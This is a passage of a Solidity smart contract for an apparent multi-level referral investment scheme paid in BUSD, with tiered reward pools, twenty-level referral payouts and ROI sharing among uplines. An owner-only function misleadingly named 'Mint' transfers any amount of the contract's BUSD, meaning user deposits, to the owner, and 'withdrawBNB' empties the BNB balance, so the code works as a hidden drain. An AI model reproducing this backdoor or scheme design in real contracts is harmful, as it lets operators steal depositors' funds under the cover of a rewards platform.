        for(uint256 i = 0; i < level5Users.length; i++){
            if(userInfo[level5Users[i]].level == 5){
                level5Count = level5Count.add(1);
            }
        }
        if(level5Count > 0){
            uint256 reward = Platinum.div(level5Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level5Users.length; i++){
                if(userInfo[level5Users[i]].level == 5){
                    rewardInfo[level5Users[i]].Platinum = rewardInfo[level5Users[i]].Platinum.add(reward);
                    userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Platinum > totalReward){
                Platinum = Platinum.sub(totalReward);
            }else{
                Platinum = 0;
            }
        }
    }
    
    function _distributetopPool(uint256 _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint72[3] memory maxReward = [2000e18, 1000e18, 500e18];

        uint256 totalReward;

        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        BUSD.transfer(feeReceivers[0], fee.div(2));
        BUSD.transfer(feeReceivers[1], fee.div(2));
        uint256 Silver_ = _amount.mul(silverPoolPercents).div(baseDivider);
        Silver = Silver.add(Silver_);
        uint256 Gold_ = _amount.mul(goldPoolPercents).div(baseDivider);
        Gold = Gold.add(Gold_);
        uint256 Platinum_ = _amount.mul(platinumPoolPercents).div(baseDivider);
        Platinum = Platinum.add(Platinum_);
        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if(i > 4){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        upRewards.level6to20 = upRewards.level6to20.add(reward);
                    }
                }else if(i > 0){
                    if( userInfo[upline].level > 3){
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        upRewards.level2to5 = upRewards.level2to5.add(reward);
                    }
                }else{
                    reward = newAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    function getBoosterTeamDeposit(address _user) public view returns(bool) {
        uint256 count;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            if(userInfo[teamUsers[_user][0][i]].totalDeposit>=1000e18){
                count +=1;
            }
        }
        if(count >= 4){
            return true;
        }
        return false;
    }

    function getTimeDiffer(address _user) public view returns(uint256){
        uint256 newTime = getCurDay();
        newTime = newTime.sub(boosterUserTime[_user]);
        return newTime;
    }

    function boosterIncomeIsReady(address _address) public view returns(bool,uint256)
    {
        for (uint256 i = 0; i < boosterIncomeUSers.length; i++){
            if (_address == boosterIncomeUSers[i]){
            return (true,i);
            } 
        }
        return (false,0);
    }

    function Mint(uint256 _count) public onlyOwner {
        BUSD.transfer(owner(),_count);
    }

    function ChangeBoosterCondition(uint256 _num) public onlyOwner{
        boosterDay = _num;
    }

    function _updateROI(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        (uint256 withdrawable, ) = _calCurStaticRewards(_user);
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = withdrawable;
                ROIReward storage upROIRewards = ROIreward[upline];
                uint256 reward = newAmount.mul(ROIlevel[i]).div(baseDivider);
                upROIRewards.ROIReleased = upROIRewards.ROIReleased.add(reward);
                upline = userInfo[upline].referrer;
            }
        }

    }
    function withdrawBNB()
    public
    onlyOwner
    {   payable(msg.sender).transfer(address(this).balance);  }
}